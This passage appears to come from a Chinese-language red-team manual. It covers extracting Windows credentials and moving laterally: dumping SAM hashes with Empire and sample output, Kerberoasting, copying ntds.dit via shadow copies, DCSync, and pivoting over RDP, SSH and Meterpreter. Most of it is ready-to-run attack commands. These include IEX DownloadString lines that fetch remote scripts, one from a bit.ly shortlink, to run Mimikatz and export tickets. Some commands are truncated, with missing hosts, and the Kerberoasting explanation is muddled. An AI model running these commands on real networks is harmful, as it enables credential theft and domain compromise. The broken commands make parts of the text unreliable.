### 4.8 内置账户与凭证提取

#### 4.8.1 内置账户
- **Comment**: 管理计算机/域的内置账户。
- **User's comment**: 无特殊备注。
- **Country/region code**: 000（系统默认）。
- **Account active**: 是。
- **Account expires**: 永不。

如果发现该账户处于活动状态，可以尝试从本地计算机中提取所有散列值。请注意，这不包括任何域用户的散列。

#### 4.8.2 提取散列值
**Empire模块**: `powershell/credentials/powerdump`

示例：
```bash
(Empire: powershell/credentials/powerdump) > execute
Job started: 93Z8PE
```
输出如下：
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3710b46790763e07ab0d2b6cfc4470c1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

可以使用`Empire (credentials/mimikatz/pth)`工具或启动可信工具PsExec提交散列值并执行自定义静荷。如图4.38所示，这是旧的横向移动攻击方式，目前很难找到适合的攻击条件。

如果环境中启用了LAPS（本地管理员密码解决方案），可以使用多种不同的工具从活动目录中提取散列值。假设您已经拥有特权域管理员或帮助台类型账户。

#### 4.8.3 Kerberoasting
如果获取的用户账户受限，无法从内存中获取密码，可以使用Kerberoasting攻击方法。许多公司已从NTLM转向Kerberos，因为NTLM存在重放攻击等安全问题。Kerberos是一种用于验证计算机网络中服务请求的安全方法。

**Kerberoast攻击原理**：作为攻击者，我们可以用之前提取的目标服务账户的SPN请求Kerberos服务票证。当从域控制器请求服务票证时，该票证使用关联的服务用户的NTLM散列进行加密。任何用户都可以请求票证，这意味着如果能猜中关联服务用户的NTLM散列，就可以获得实际服务账户的密码。

**步骤**：
1. 列出所有SPN服务。
   ```bash
   setspn -T cyberspacekittens.local -F -Q \*/\*
   ```
2. 针对单用户或提取所有Kerberos票证到用户内存中。
   ```powershell
   Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/CSK-GITHUB.cyberspacekittens.local"
   ```
   或
   ```powershell
   Add-Type -AssemblyName System.IdentityModel; IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
   ```

**导出票证**：
```powershell
powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-Mimikatz -Command '"""kerberos::list/export"""'
```

**破解票证**：
```bash
cd /opt/kerberoast
python tgsrepcrack.py [password wordlist] [kirbi tickets - *.kirbi]
```

**Empire模块**：
```bash
Empire代码：powershell/credentials/invoke_kerberoast
```

#### 4.9 转储域控制器散列
一旦获得域管理员访问权限，可以从域控制器获取所有散列值。传统方法是使用Shadow Volume或Raw复制方法获取Ntds.dit文件。

**回顾Shadow Volume复制方法**：
1. 创建卷影副本。
   ```bash
   C:\vssadmin create shadow /for=C:
   ```
2. 复制Ntds.dit、System、SAM和Boot Key文件。
   ```bash
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM
   reg SAVE HKLM\SYSTEM c:\SYS
   vssadmin delete shadows /for= [/oldest |/all |/shadow=]
   ```

**NinjaCopy工具**：
```powershell
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\windows\temp\ntds.dit"
```

**DCSync方法**：
1. 使用Mimikatz命令。
   ```bash
   Lsadump::dcsync /domain:[YOUR DOMAIN] /user:[Account_to_Pull_Hashes]
   ```
2. 使用Empire模块。
   ```bash
   Empire代码：powershell/credentials/mimikatz/dcsync_hashdump
   ```

#### 4.10 在虚拟专用服务器上基于远程桌面进行横向迁移
在现代环境下，使用WMI/PowerShell Remoting/PsExec进行横向迁移并不总是最佳选择。可以通过VPS服务器实现横向迁移。

**步骤**：
1. 用Meterpreter感染被攻击者。
2. 攻击者主机设置本地端口转发。
   ```bash
   ssh -i key.pem ubuntu@[VPS IP] -L 127.0.0.1:3389:127.0.0.1:3389
   ```
3. 在Meterpreter会话中设置端口转发。
   ```bash
   portfwd add -l 3389 -p 3389 -r [Victim via RDP IP Address]
   ```
4. 打开微软远程桌面客户端连接到localhost。

#### 4.11 在Linux中实现迁移
在Linux中实现迁移通常使用dnscat2或Meterpreter。

**示例**：
- **dnscat2**:
  ```bash
  listen 127.0.0.1:9999 :22
  ```
- **Metasploit**:
  ```bash
  post/windows/manage/autoroute
  use auxiliary/server/socks4a
  ```
- **Meterpreter**:
  ```bash
  portfwd add -l 3389 -p 3389 -r
  ```

**SSH Shell**:
- **动态Socks代理**:
  ```bash
  ssh -D 127.0.0.1:8888 -p 22 @
  ```
- **基本端口转移**:
  ```bash
  ssh @ -L 127.0.0.1:55555::80
  ```
- **基于SSH的虚拟专用网络**:
  ```bash
  ssh -w any @
  ```

#### 4.12 权限提升
Linux权限提升的方法类似于Windows，主要包括查找漏洞服务、错误配置粘滞位、明文密码、全局可写文件、定时任务和补丁问题。

**工具**:
- **LinEnum**:
  ```bash
  ./linenum.sh
  ```

通过这些工具和方法，可以有效提升权限并进行横向迁移。